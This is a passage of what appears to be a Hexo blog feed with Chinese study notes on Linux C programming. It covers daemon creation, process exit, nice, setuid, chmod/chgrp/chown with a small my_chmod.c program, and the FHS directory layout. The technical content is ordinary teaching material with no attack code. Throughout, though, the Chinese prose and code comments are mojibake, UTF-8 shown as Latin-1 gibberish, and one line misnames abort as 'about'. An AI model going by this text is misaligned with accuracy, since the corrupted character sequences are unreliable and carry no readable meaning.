class="line">signal(SIGTSTP,SIG_IGN); </span><br><span class="line">signal(SIGHUP ,SIG_IGN);</span><br><span class="line"> </span><br><span class="line"><span class="comment">// 2ï¼‰åœ¨åå°è¿è¡Œ</span></span><br><span class="line">    <span class="keyword">if</span>( pid=fork() )&#123; <span class="comment">// çˆ¶è¿›ç¨‹</span></span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>); <span class="comment">//ç»“æŸçˆ¶è¿›ç¨‹ï¼Œå­è¿›ç¨‹ç»§ç»­</span></span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(pid&lt; <span class="number">0</span>)&#123; <span class="comment">// å‡ºé”™</span></span><br><span class="line">perror(<span class="string">&quot;fork&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 3ï¼‰è„±ç¦»æ§åˆ¶ç»ˆç«¯ã€ç™»å½•ä¼šè¯å’Œè¿›ç¨‹ç»„</span></span><br><span class="line">setsid();  </span><br><span class="line"></span><br><span class="line"><span class="comment">// 4ï¼‰ç¦æ­¢è¿›ç¨‹é‡æ–°æ‰“å¼€æ§åˆ¶ç»ˆç«¯</span></span><br><span class="line"><span class="keyword">if</span>( pid=fork() )&#123; <span class="comment">// çˆ¶è¿›ç¨‹</span></span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);      <span class="comment">// ç»“æŸç¬¬ä¸€å­è¿›ç¨‹ï¼Œç¬¬äºŒå­è¿›ç¨‹ç»§ç»­ï¼ˆç¬¬äºŒå­è¿›ç¨‹ä¸å†æ˜¯ä¼šè¯ç»„é•¿ï¼‰ </span></span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(pid&lt; <span class="number">0</span>)&#123; <span class="comment">// å‡ºé”™</span></span><br><span class="line">perror(<span class="string">&quot;fork&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line"><span class="comment">// 5ï¼‰å…³é—­æ‰“å¼€çš„æ–‡ä»¶æè¿°ç¬¦</span></span><br><span class="line"><span class="comment">// NOFILE ä¸º &lt;sys/param.h&gt; çš„å®å®šä¹‰</span></span><br><span class="line"><span class="comment">// NOFILE ä¸ºæ–‡ä»¶æè¿°ç¬¦æœ€å¤§ä¸ªæ•°ï¼Œä¸åŒç³»ç»Ÿæœ‰ä¸åŒé™åˆ¶</span></span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>; i&lt; NOFILE; ++i)&#123;</span><br><span class="line">close(i);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 6ï¼‰æ”¹å˜å½“å‰å·¥ä½œç›®å½•</span></span><br><span class="line">chdir(<span class="string">&quot;/&quot;</span>); </span><br><span class="line"></span><br><span class="line"><span class="comment">// 7ï¼‰é‡è®¾æ–‡ä»¶åˆ›å»ºæ©æ¨¡</span></span><br><span class="line">umask(<span class="number">0</span>);  </span><br><span class="line"></span><br><span class="line"><span class="comment">// 8ï¼‰å¤„ç† SIGCHLD ä¿¡å·</span></span><br><span class="line">signal(SIGCHLD,SIG_IGN);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>; </span><br><span class="line">&#125; </span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">init_daemon();</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>);</span><br><span class="line"> </span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿è¡Œç»“æœå¦‚ä¸‹ï¼š</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/qW14fjEDrHQdXMK.png" alt="image-20210207213739752"></p><h2 id="è¿›ç¨‹é€€å‡º"><a href="#è¿›ç¨‹é€€å‡º" class="headerlink" title="è¿›ç¨‹é€€å‡º"></a>è¿›ç¨‹é€€å‡º</h2><p>æ–¹å¼ï¼š</p><ul><li>æ­£å¸¸é€€å‡º<ul><li>åœ¨mainå‡½æ•°ä¸­æ‰§è¡Œreturn</li><li>è°ƒç”¨ <code>exit</code> å‡½æ•° ï¼ˆå¤´æ–‡ä»¶<code>stdlib.h</code>ï¼‰</li><li>è°ƒç”¨ <code>_exit</code> å‡½æ•° ï¼ˆå¤´æ–‡ä»¶<code>unistd.h</code>ï¼‰</li></ul></li><li>å¼‚å¸¸é€€å‡º<ul><li>è°ƒç”¨ <code>about</code> å‡½æ•°</li><li>è¿›ç¨‹æ”¶åˆ°æŸä¸ªä¿¡å·ï¼Œè¯¥ä¿¡å·ä½¿ç¨‹åºç»ˆæ­¢ã€‚</li></ul></li></ul><h2 id="æ”¹å˜è¿›ç¨‹çš„ä¼˜å…ˆçº§"><a href="#æ”¹å˜è¿›ç¨‹çš„ä¼˜å…ˆçº§" class="headerlink" title="æ”¹å˜è¿›ç¨‹çš„ä¼˜å…ˆçº§"></a>æ”¹å˜è¿›ç¨‹çš„ä¼˜å…ˆçº§</h2><p>æ”¹å˜è¿›ç¨‹çš„ä¼˜å…ˆçº§æ˜¯é€šè¿‡ç³»ç»Ÿè°ƒç”¨<code>nice</code>å‡½æ•°æ”¹å˜ã€‚</p><p><code>man 2 nice </code> å‘½ä»¤è·å–è¯¥å‡½æ•°çš„å£°æ˜ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">nice</span><span class="params">(<span class="keyword">int</span> inc)</span></span>;</span><br></pre></td></tr></table></figure><p>ç›¸å…³çš„ä¸¤ä¸ªé‡è¦å‡½æ•°ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">getpriority                           è¯¥å‡½æ•°è¿”å›ä¸€ç»„è¿›ç¨‹çš„ä¼˜å…ˆçº§ã€‚</span><br><span class="line">setpriority                           è¯¥å‡½æ•°ç”¨æ¥è®¾ç½®åˆ¶å®šè¿›ç¨‹çš„ä¼˜å…ˆçº§ã€‚</span><br></pre></td></tr></table></figure><h2 id="setuidå‡½æ•°"><a href="#setuidå‡½æ•°" class="headerlink" title="setuidå‡½æ•°"></a>setuidå‡½æ•°</h2><p>å¯ä»¥ç”¨ <code>setuid</code> è®¾ç½®å®é™…ç”¨æˆ· ID å’Œæœ‰æ•ˆç”¨æˆ· ID ã€‚</p><blockquote><p>å†…æ ¸æ£€æŸ¥ä¸€ä¸ªè¿›ç¨‹æ˜¯å¦å…·æœ‰è®¿é—®æŸæ–‡ä»¶çš„æƒé™æ—¶ï¼Œæ˜¯ä½¿ç”¨è¿›ç¨‹çš„æœ‰æ•ˆç”¨æˆ· ID æ¥è¿›è¡Œæ£€æŸ¥çš„ã€‚<code>su</code> ç¨‹åºçš„æ–‡ä»¶å±ä¸»æ˜¯ root,æ™®é€šç”¨æˆ·è¿è¡Œ <code>su</code> å‘½ä»¤æ—¶ï¼Œ<code>su</code> è¿›ç¨‹çš„æƒé™æ˜¯rootæƒé™ã€‚</p></blockquote><blockquote><p>æ³¨æ„ï¼Œå› ä¸ºLinuxç³»ç»Ÿä¸­rootç”¨æˆ·æ‹¥æœ‰æœ€é«˜æƒåŠ›ï¼Œé»‘å®¢ä»¬å¾€å¾€å–œæ¬¢å¯»æ‰¾è®¾ç½®äº†<code>set_uid</code>ä½çš„å¯æ‰§è¡Œç¨‹åºçš„æ¼æ´ã€‚è¿™æ ·çš„ç¨‹åºå¦‚æœå­˜åœ¨ç¼“å†²åŒºæº¢å‡ºæ¼æ´ï¼Œå¹¶ä¸”è¯¥ç¨‹åºæ˜¯ä¸€ä¸ªç½‘ç»œç¨‹åºã€‚é‚£ä¹ˆé»‘å®¢å¯ä»¥ä»è¿œç¨‹çš„åœ°æ–¹è½»æ¾çš„åˆ©ç”¨è¯¥æ¼æ´è·å¾—è¿è¡Œè¯¥æ¼æ´ç¨‹åºçš„ä¸»æœºçš„rootæƒé™ã€‚å³ä½¿è¿™æ ·çš„ç¨‹åºä¸æ˜¯ç½‘ç»œç¨‹åºï¼Œé‚£ä¹ˆä¹Ÿå¯ä»¥ä½¿æœ¬æœºä¸Šçš„æ¶æ„æ™®é€šç”¨æˆ·æå‡ä¸ºrootç”¨æˆ·ã€‚</p></blockquote><h1 id="ç»“è¯­"><a href="#ç»“è¯­" class="headerlink" title="ç»“è¯­"></a>ç»“è¯­</h1><blockquote><p>å…³äºç« æœ«çš„ç¼–ç¨‹å®è·µï¼šå®ç°è‡ªå·±çš„ myshellï¼Œå¥ˆä½•èƒ½åŠ›ä¸å¤Ÿï¼Œå¯¹æˆ‘æ¥è¯´æ˜¯å¾ˆéš¾å®ç°äº†ã€‚è¿™é‡Œä¾ç„¶ç»™å‡ºå­¦é•¿çš„ä»£ç ï¼Œå¯ä½œæ—¥åæ¬£èµã€‚(æ»‘ç¨½-&gt; &lt;-)</p><p><a href="https://github.com/Evil-crow/Linux_C/tree/master/Chapter_VII/Shell">https://github.com/Evil-crow/Linux_C/tree/master/Chapter_VII/Shell</a></p></blockquote><h1 id="å‚è€ƒèµ„æ–™"><a href="#å‚è€ƒèµ„æ–™" class="headerlink" title="å‚è€ƒèµ„æ–™"></a>å‚è€ƒèµ„æ–™</h1><p>[1] Linux C ç¼–ç¨‹å®æˆ˜ç¬¬ä¸ƒç« è¿›ç¨‹æ§åˆ¶</p><p>[2] <a href="https://blog.csdn.net/mijichui2153/article/details/81394387">åˆ›å»ºå®ˆæŠ¤è¿›ç¨‹çš„æ­¥éª¤</a></p><p>[3] <a href="https://tennysonsky.blog.csdn.net/article/details/45970087?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-1.control&depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-1.control">Linuxç³»ç»Ÿç¼–ç¨‹â€”â€”ç‰¹æ®Šè¿›ç¨‹ä¹‹å®ˆæŠ¤è¿›ç¨‹</a></p>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux Cç¼–ç¨‹å®æˆ˜ä¹‹æ–‡ä»¶æ“ä½œå­¦ä¹ è®°å½•</title>
      <link href="posts/46255.html"/>
      <url>posts/46255.html</url>
      
        <content type="html"><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><blockquote><p>åœ¨ Linux ä¸­ï¼Œç”¨æˆ·å¯ä»¥ä½¿ç”¨å‘½ä»¤å¯¹æ–‡ä»¶è¿›è¡Œå„ç§æ“ä½œï¼Œè€Œå‡ æ¡ç®€å•å‘½ä»¤èƒŒåå´æ˜¯å¤§æ®µå¤§æ®µçš„ç¨‹åºå®ç°ä»£ç ã€‚Linux C ç¼–ç¨‹å®æˆ˜ç¬¬å…­ç« æ–‡ä»¶æ“ä½œä¸­å…³äºæ–‡ä»¶çš„åˆ›å»ºï¼Œæ‰“å¼€ï¼Œè¯»å†™ï¼Œå…³é—­ï¼Œåˆ é™¤ï¼Œå±æ€§ç­‰å†…å®¹ååˆ†è¯¦å®ï¼Œè¿™é‡Œåªæ˜¯å¯¹æ–‡ä»¶æƒé™å’Œç›®å½•é…ç½®çš„å†…å®¹è¿›è¡Œç®€å•è®°å½•ã€‚</p></blockquote><h1 id="æ–‡ä»¶ç»“æ„"><a href="#æ–‡ä»¶ç»“æ„" class="headerlink" title="æ–‡ä»¶ç»“æ„"></a>æ–‡ä»¶ç»“æ„</h1><p>æ–‡ä»¶ä¸»è¦åŒ…å«ä¸¤æ–¹é¢å†…å®¹ï¼š</p><ul><li>æ–‡ä»¶æœ¬èº«åŒ…å«çš„æ•°æ®</li><li>æ–‡ä»¶çš„å±æ€§ï¼ŒåŒ…æ‹¬æ–‡ä»¶è®¿é—®æƒé™ã€æ‰€æœ‰è€…ã€æ–‡ä»¶å¤§å°ã€åˆ›å»ºæ—¥æœŸç­‰ã€‚</li></ul><h1 id="æ–‡ä»¶æƒé™"><a href="#æ–‡ä»¶æƒé™" class="headerlink" title="æ–‡ä»¶æƒé™"></a>æ–‡ä»¶æƒé™</h1><p>åœ¨ Linux ä¸­æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ <code>ll</code> æˆ–è€… <code>ls â€“l</code> å‘½ä»¤æ¥æ˜¾ç¤ºä¸€ä¸ªæ–‡ä»¶çš„å±æ€§ä»¥åŠæ–‡ä»¶æ‰€å±çš„ç”¨æˆ·å’Œç»„ï¼Œå¦‚</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/U8ItepXPJgNDua9.png"></p><p>ä¸Šé¢çš„è¿è¡Œç»“æœä»å·¦è‡³å³ä¾æ¬¡æ˜¯ï¼šæ–‡ä»¶å±æ€§ã€æ–‡ä»¶æ•°ã€æ‰€å±çš„ç”¨æˆ·ã€æ‰€å±çš„ç”¨æˆ·æ‰€åœ¨çš„ç»„ã€æ–‡ä»¶å¤§å°ï¼ˆå•ä½bytesï¼‰ã€æ–‡ä»¶åˆ›å»ºæ—¶é—´ã€æ–‡ä»¶åã€‚</p><p>æ¯ä¸ªæ–‡ä»¶çš„å±æ€§ç”±å·¦è¾¹ç¬¬ä¸€éƒ¨åˆ†çš„ 10 ä¸ªå­—ç¬¦æ¥ç¡®å®šï¼ˆå¦‚ä¸‹å›¾ï¼‰ã€‚</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/6BRKPAWq7rnzxSd.png" alt="image-20210208214725950"></p><p>æ–‡ä»¶ç±»å‹ï¼š</p><ul><li><code>-</code> è¡¨ç¤ºæ™®é€šæ–‡ä»¶</li><li><code>d</code> è¡¨ç¤ºç›®å½•æ–‡ä»¶</li><li><code>l</code> è¡¨ç¤ºé“¾æ¥æ–‡ä»¶ï¼Œæ¯”å¦‚å¿«æ·æ–¹å¼</li><li><code>s</code> å¥—æ¥å­—æ–‡ä»¶</li><li><code>c</code> å­—ç¬¦è®¾å¤‡æ–‡ä»¶ï¼Œæ¯”å¦‚<code>/dev/</code>ä¸­çš„å¾ˆå¤šæ–‡ä»¶</li><li><code>b</code> è¡¨ç¤ºå—è®¾å¤‡æ–‡ä»¶ï¼Œæ¯”å¦‚ä¸€äº›ç£ç›˜</li><li><code>p</code> ç®¡é“æ–‡ä»¶</li></ul><h2 id="chmod-change-model-æ”¹å˜æƒé™"><a href="#chmod-change-model-æ”¹å˜æƒé™" class="headerlink" title="chmod(change model) æ”¹å˜æƒé™"></a>chmod(change model) æ”¹å˜æƒé™</h2><p>å¯¹æ–‡ä»¶çš„è®¿é—®æƒé™çš„ä¿®æ”¹é€šè¿‡å‘½ä»¤ <code>chmod</code> æ¥è¿›è¡Œï¼Œå¦‚ï¼Œ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod 777 test.c</span><br></pre></td></tr></table></figure><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/jUZPQhJbiuYq3GI.png" alt="image-20210208221801438"></p><p>å¯¹äºå¯è¯»ï¼Œå¯å†™ï¼Œå¯æ‰§è¡Œä¸‰ç§æƒé™ï¼Œå®ƒä»¬åˆ†åˆ«å¯¹åº”ä¸€ä¸ªå€¼ï¼Œ<strong>r = 4, w = 2, x = 1</strong></p><p>4+2+1=7ï¼Œ777 è¡¨ç¤ºå°†test.c çš„è®¿é—®æƒé™ä¿®æ”¹ä¸ºï¼šæ‰€æœ‰è€…ï¼Œæ‰€å±ç»„ï¼Œå…¶ä»–ç”¨æˆ·éƒ½æœ‰è¯»ï¼Œå†™ï¼Œæ‰§è¡Œçš„æƒé™ã€‚ </p><blockquote><p>rï¼šå¯è¯»ï¼Œæ„æ€æ˜¯æŒ‡å¯ä»¥è¯»å–æ–‡ä»¶çš„å†…å®¹</p><p>wï¼šå¯å†™ï¼Œæ„æ€å°±æ˜¯å¯ä»¥ä¿®æ”¹æ–‡ä»¶çš„å†…å®¹</p><p>xï¼šå¯æ‰§è¡Œï¼Œä¸windowsä¸åŒï¼Œlinuxä¸‹æ–‡ä»¶å¯æ‰§è¡Œä¸å¦ä¸åç¼€åæ— å…³ï¼Œè€Œä¸xæƒé™å±æ€§ç›¸å…³</p></blockquote><p>ç®€åŒ–ç‰ˆchmod å‘½ä»¤ <code>my_chmod.c</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc ,<span class="keyword">char</span> **argv)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> mod,mod_u,mod_g,mod_o;</span><br><span class="line">    <span class="keyword">char</span> *path;</span><br><span class="line">    <span class="keyword">if</span>(argc&lt;<span class="number">3</span>)&#123;<span class="comment">//æ£€æŸ¥å‚æ•°åˆæ³•æ€§</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s &lt;chmod num&gt;&lt;path&gt;\n&quot;</span>,argv[<span class="number">0</span>]);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    mod=atoi(argv[<span class="number">1</span>]);<span class="comment">//å°†å­—ç¬¦ä¸²è½¬æ¢æˆæ•´æ•°</span></span><br><span class="line">    <span class="keyword">if</span>(mod&gt;<span class="number">777</span>||mod&lt;<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;mod num error&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    mod_u=mod/<span class="number">100</span>;<span class="comment">//æ‰€æœ‰è€…æƒé™</span></span><br><span class="line">    mod_g=(mod-mod_u*<span class="number">100</span>)/<span class="number">10</span>;<span class="comment">//æ‰€å±ç»„æƒé™</span></span><br><span class="line">    mod_o=mod-mod_u*<span class="number">100</span>-mod_g*<span class="number">10</span>;<span class="comment">//å…¶ä»–ç”¨æˆ·æƒé™</span></span><br><span class="line">    mod=mod_u*<span class="number">8</span>*<span class="number">8</span>+mod_g*<span class="number">8</span>+mod_o;<span class="comment">//å…«è¿›åˆ¶è½¬æ¢</span></span><br><span class="line">    path=argv[<span class="number">2</span>];</span><br><span class="line">    <span class="keyword">if</span>(chmod(path,mod)==<span class="number">-1</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;chmod error&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿è¡Œç»“æœå¦‚ä¸‹ï¼š</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/lpTEnPzkKgAc1oe.png" alt="image-20210208223940269"></p><p>å¯è§ test.c æ–‡ä»¶çš„æƒé™å·²è¢«ä¿®æ”¹ã€‚</p><h2 id="chgrp-change-group-æ”¹å˜ç”¨æˆ·ç»„"><a href="#chgrp-change-group-æ”¹å˜ç”¨æˆ·ç»„" class="headerlink" title="chgrp(change group) æ”¹å˜ç”¨æˆ·ç»„"></a>chgrp(change group) æ”¹å˜ç”¨æˆ·ç»„</h2><p>é‡è¦å‚æ•°ï¼š<code>-R</code> é€’å½’æ”¹å˜æƒé™ï¼Œå³æŠŠè¯¥ç›®å½•ä¸‹çš„æ–‡ä»¶ï¼Œç›®å½•çš„æƒé™å…¨éƒ¨åŒæ­¥ä¿®æ”¹ï¼Œå¾ˆå¥½ç”¨ï¼Œä¹Ÿå¾ˆå±é™©ï¼</p><p>è¯­æ³•ï¼š <code>chgrp [-R] group dirname/filename </code> (ç›®å½•/æ–‡ä»¶åï¼‰</p><p>å¦‚ä¸‹ä¾‹æ‰€ç¤ºï¼š</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/HNysAV21rWGIKpJ.png" alt="image-20210214083539619"></p><h2 id="chown-change-owner-æ”¹å˜ç”¨æˆ·"><a href="#chown-change-owner-æ”¹å˜ç”¨æˆ·" class="headerlink" title="chown(change owner) æ”¹å˜ç”¨æˆ·"></a>chown(change owner) æ”¹å˜ç”¨æˆ·</h2><p>é‡è¦å‚æ•°ï¼šåŒä¸Š [-R]ï¼Œé€’å½’æ›´æ”¹ç”¨æˆ·</p><p>è¯­æ³•ï¼š<code>chown [-R] owner dirname/filename</code> æ”¹å˜æ‰€å±ç”¨æˆ·</p><p> <code>chown [-R] owner:group dirname/filename</code>  æ”¹å˜æ‰€å±ç”¨æˆ·ï¼Œç”¨æˆ·ç»„</p><p><code> chown [-R] .group dirname/filename</code>  æ”¹å˜æ‰€å±ç”¨æˆ·ç»„</p><p>å¦‚ä¸‹ä¾‹æ‰€ç¤ºï¼š</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/brRZeJ75j8DLtXu.png" alt="image-20210214084556022"></p><h1 id="ç›®å½•é…ç½®"><a href="#ç›®å½•é…ç½®" class="headerlink" title="ç›®å½•é…ç½®"></a>ç›®å½•é…ç½®</h1><p>linuxç³»ç»Ÿçš„å‘è¡Œç‰ˆæœ¬ä¼—å¤šï¼Œå¦‚æœæ›´æ¢ä¸€ä¸ªç‰ˆæœ¬çš„Linuxç³»ç»Ÿï¼Œå°±éœ€è¦é‡æ–°å­¦ä¹ Linuxç³»ç»Ÿçš„ç›®å½•é…ç½®ï¼Œå²‚ä¸æ˜¯å¾ˆéº»çƒ¦ï¼Ÿï¼Ÿï¼Ÿæ‰€ä»¥åˆ¶å®šäº†FHSï¼Œå³ Filesystem Hierarchy Standard(æ–‡ä»¶ç³»ç»Ÿé…ç½®æ ‡å‡†)ï¼Œä»¥æ­¤æ¥è¿›è¡Œç›®å½•é…ç½®è§„èŒƒã€‚</p><p>FHSæ ‡å‡†å¯¹äºï¼¬inuxç³»ç»Ÿçš„ç›®å½•é…ç½®æ–‡ä»¶ï¼Œåªå®šä¹‰äº†ä¸‰å±‚ç›®å½•é…ç½®ï¼š</p><blockquote><p>/ (root)ç›®å½•ï¼šä¸å¼€æœºç³»ç»Ÿæœ‰å…³</p><p>/usrç›®å½•ï¼šä¸è½¯ä»¶å®‰è£…/æ‰§è¡Œæœ‰å…³</p><p>/varç›®å½•ï¼šä¸ç³»ç»Ÿè¿ä½œè¿‡ç¨‹æœ‰å…³</p></blockquote><h2 id="æ ¹ç›®å½•"><a href="#æ ¹ç›®å½•" class="headerlink" title="/ æ ¹ç›®å½•"></a>/ æ ¹ç›®å½•</h2><p>/ æ ¹ç›®å½•ï¼Œæ˜¯Linuxç³»ç»Ÿä¸­æœ€é‡è¦çš„ä¸€ä¸ªç›®å½•äº†ï¼æ‰€æœ‰çš„ç›®å½•éƒ½æ˜¯ç”±æ ¹ç›®å½•æ‰€è¡ç”Ÿå‡ºæ¥çš„ï¼Œè€Œä¸”æ ¹ç›®å½•è¿˜ä¸æœºå™¨çš„å¼€æœºï¼Œè¿˜åŸï¼Œç³»ç»Ÿä¿®å¤æœ‰å…³ã€‚æ ¹ç›®å½•ä¸‹çš„ä¸€äº›ç›®å½•ï¼š</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/84qnhEpZfl6wuOt.png" alt="image-20210214215243141"></p><table><thead><tr><th align="center">ç›®å½•</th><th align="center">åº”æ”¾ç½®çš„æ–‡ä»¶å†…å®¹</th></tr></thead><tbody><tr><td align="center">/bin</td><td align="center">binä¸ºbinaryçš„ç®€å†™ï¼Œä¸»è¦æ”¾ç½®ç³»ç»Ÿçš„å¿…å¤‡æ‰§è¡Œæ–‡ä»¶ï¼Œä¾‹å¦‚ï¼šcatã€cpã€chmod dfã€dmesgã€gzipã€killã€lsã€mkdirã€moreã€mountã€rmã€suã€tarç­‰ã€‚</td></tr><tr><td align="center">/boot</td><td align="center">/bootä¸­å­˜æ”¾å†…æ ¸æ–‡ä»¶ä»¥åŠå¼€æœºé…ç½®æ–‡ä»¶</td></tr><tr><td align="center">/dev</td><td align="center">ä¹‹å‰è®²ä¸€åˆ‡çš†æ–‡ä»¶ï¼Œ/devç›®å½•ä¸‹éƒ½æ˜¯è®¾å¤‡æ–‡ä»¶</td></tr><tr><td align="center">/etc</td><td align="center">ç³»ç»Ÿçš„ä¸»è¦é…ç½®æ–‡ä»¶éƒ½å­˜æ”¾åœ¨æ­¤å¤„</td></tr><tr><td align="center">/home</td><td align="center">homeç›®å½•å³ä¸ºç”¨æˆ·ç›®å½•</td></tr><tr><td align="center">/lib</td><td align="center">ç³»ç»Ÿå¼€æœºæ—¶æ‰€ç”¨åˆ°çš„å‡½æ•°åº“</td></tr><tr><td align="center">/media</td><td align="center">â€œåª’ä½“â€ï¼ŒæŒ‡è½¯ç›˜ï¼Œå…‰ç›˜ç­‰è®¾å¤‡</td></tr><tr><td align="center">/mnt</td><td align="center">ç”¨äºæš‚æ—¶æŒ‚è½½çš„ç›®å½•</td></tr><tr><td align="center">/opt</td><td align="center">ç”¨äºç»™ç¬¬ä¸‰æ–¹è½¯ä»¶æ”¾ç½®çš„ç›®å½•</td></tr><tr><td align="center">/root</td><td align="center">ç³»ç»Ÿç®¡ç†å‘˜ç›®å½•</td></tr><tr><td align="center">/sbin</td><td align="center">ä¸»è¦æ”¾ç½®ç³»ç»Ÿç®¡ç†çš„å¿…å¤‡ç¨‹åºï¼Œä¾‹å¦‚ï¼šdumpã€haltã€ifconfigã€ifupã€ ifdownã€initã€rebootã€rmmodã€ runlevelã€shutdownç­‰ã€‚</td></tr><tr><td align="center">/tmp</td><td align="center">ä¸€èˆ¬ç”¨æˆ·æˆ–è€…æš‚æ—¶æ”¾ç½®æ•°æ®çš„åœ°æ–¹</td></tr><tr><td align="center">/lost+found</td><td align="center">æ–‡ä»¶ç³»ç»Ÿå‘ç”Ÿé”™è¯¯æ—¶,å°†ä¸€äº›ä¸¢å¤±çš„ç‰‡æ®µæ”¾åœ¨è¯¥ç›®å½•ä¸‹</td></tr><tr><td align="center">/proc</td><td align="center">è¯¥ç›®å½•æ˜¯ä¸€ä¸ªè™šæ‹Ÿçš„æ–‡ä»¶ç³»ç»Ÿ,æ”¾ç½®çš„æ•°æ®éƒ½æ˜¯åœ¨å†…å­˜å½“ä¸­çš„,ä¾‹å¦‚ç³»ç»Ÿçš„å†…æ ¸,è¿›ç¨‹,å¤–éƒ¨è®¾å¤‡çš„çŠ¶æ€,ç½‘ç»œçŠ¶æ€ç­‰</td></tr><tr><td align="center">/sys</td><td align="center">å­˜æ”¾ç€å·²åŠ è½½çš„å†…æ ¸æ¨¡å—å’Œå†…æ ¸ç›‘æµ‹åˆ°çš„ç¡¬ä»¶è®¾å¤‡ä¿¡æ¯ç­‰</td></tr></tbody></table><h2 id="usr-ç›®å½•"><a href="#usr-ç›®å½•" class="headerlink" title="/usr ç›®å½•"></a>/usr ç›®å½•</h2><p>/usr(UNIX Software Resource)æ˜¯ä¸è½¯ä»¶çš„å®‰è£…/æ‰§è¡Œæœ‰å…³çš„ç›®å½•ï¼Œæ‰€å­˜æ”¾çš„æ˜¯<strong>å¯åˆ†äº«çš„</strong>ä¸<strong>ä¸å¯å˜åŠ¨çš„</strong>æ•°æ®æ–‡ä»¶ã€‚å…¶ä¸‹ç›®å½•æœ‰ï¼š</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/W8gxSdt43OComTi.png" 